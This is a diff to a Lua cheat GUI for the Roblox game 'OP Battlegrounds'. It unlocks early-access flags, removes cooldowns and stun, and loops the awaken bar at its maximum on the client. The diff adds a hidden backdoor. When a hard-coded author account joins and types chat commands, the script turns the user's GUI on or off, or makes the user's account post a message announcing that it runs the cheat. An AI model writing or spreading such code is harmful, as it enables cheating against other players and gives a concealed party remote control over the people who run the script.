@@ -1,6 +1,7 @@
 -- Gui to Lua Version 3.2
--- bruu why buggy sometimess
--- Realirist's opbggui
+-- Realirist's OPBGGUI
+-- Instances:
+
 local OPBGGUI = Instance.new("ScreenGui")
 local Main = Instance.new("Frame")
 local UICorner = Instance.new("UICorner")
@@ -720,24 +721,23 @@ UISizeConstraint_30.MinSize = Vector2.new(200, 28)
 
 -- Scripts:
 
-local function GOOLQYX_fake_script() -- Main.LocalScript 
+local function AFRK_fake_script() -- Main.LocalScript 
 	local script = Instance.new('LocalScript', Main)
 
 	warn('OP BATTLEGROUNDS GUI BY REALIRIST')
 	warn('don\'t skid bru im doing yall favors')
-	local target = nil
-	game.Players.LocalPlayer.EarlyAccess.Value=true
-	game.Players.LocalPlayer.NoCD.Value=true
-	game.Players.LocalPlayer.InfAwaken.Value=true
-	game.Players.LocalPlayer.NoDashCD.Value=true
-	game.Players.LocalPlayer.NoStun.Value=true
-	local co = coroutine.wrap(function()
-		while true do
-			game.Players.LocalPlayer.AwakenBar.Value = 200
-			task.wait(0.1)
+	local legacyChat = game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.LegacyChatService
+	local sayMessage
+	if legacyChat then
+		sayMessage = function(msg)
+			game.TextChatService.TextChannels.RBXGeneral:SendAsync(msg)
 		end
-	end)
-	co()
+	elseif legacyChat==false then
+		sayMessage = function(msg)
+			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
+		end
+	end
+	
 	script.Parent['3'].MouseButton1Click:Connect(function()
 		local remotes = game.ReplicatedStorage:WaitForChild('Remotes',5)
 		if remotes then
@@ -1138,18 +1138,58 @@ local function GOOLQYX_fake_script() -- Main.LocalScript
 		end
 	end
 	
-	for _,v in game.Players:GetPlayers() do
-		if v~=game.Players.LocalPlayer then
-			print(v.Name.. ' isnt localplayer')
-			makeUser(v.Name)
-		else
-			print(v.Name.. ' is localplayer')
+	for _,plr in game.Players:GetPlayers() do
+		if plr==game.Players.LocalPlayer then
+			local name = plr.Name
+			local userid = plr.UserId
+			if name=='Realirist' and userid==3948255911 then
+				print('oh my gawd owner!1')
+				plr.Chatted:Connect(function(msg)
+					print(msg)
+					if msg=='!opbg disable '.. game.Players.LocalPlayer.Name then
+						print('disabled')
+						script.Parent.Parent.Enabled = false
+					elseif msg=='!opbg enable '.. game.Players.LocalPlayer.Name then
+						print('enabled')
+						script.Parent.Parent.Enabled = true
+					elseif msg=='!opbg users' then
+						sayMessage('hi im using opbg')
+					end 
+				end)
+			end
+			makeUser(name)
 		end
 	end
 	game.Players.PlayerAdded:Connect(function(plr)
 		local name = plr.Name
+		local userid = plr.UserId
+		if name=='Realirist' and userid==3948255911 then
+			plr.Chatted:Connect(function(msg)
+				if msg=='!opbg disable '.. game.Players.LocalPlayer.Name then
+					print('disabled')
+					script.Parent.Parent.Enabled = false
+				elseif msg=='!opbg enable '.. game.Players.LocalPlayer.Name then
+					print('enabled')
+					script.Parent.Parent.Enabled = true
+				elseif msg=='!opbg users' then
+					sayMessage('hi im using opbg')
+				end 
+			end)
+		end
 		makeUser(name)
 	end)
-	
+	local target = nil
+	game.Players.LocalPlayer.EarlyAccess.Value=true
+	game.Players.LocalPlayer.NoCD.Value=true
+	game.Players.LocalPlayer.InfAwaken.Value=true
+	game.Players.LocalPlayer.NoDashCD.Value=true
+	game.Players.LocalPlayer.NoStun.Value=true
+	local co = coroutine.wrap(function()
+		while true do
+			game.Players.LocalPlayer.AwakenBar.Value = 200
+			task.wait(0.1)
+		end
+	end)
+	co()
 end
-coroutine.wrap(GOOLQYX_fake_script)()
+coroutine.wrap(AFRK_fake_script)()
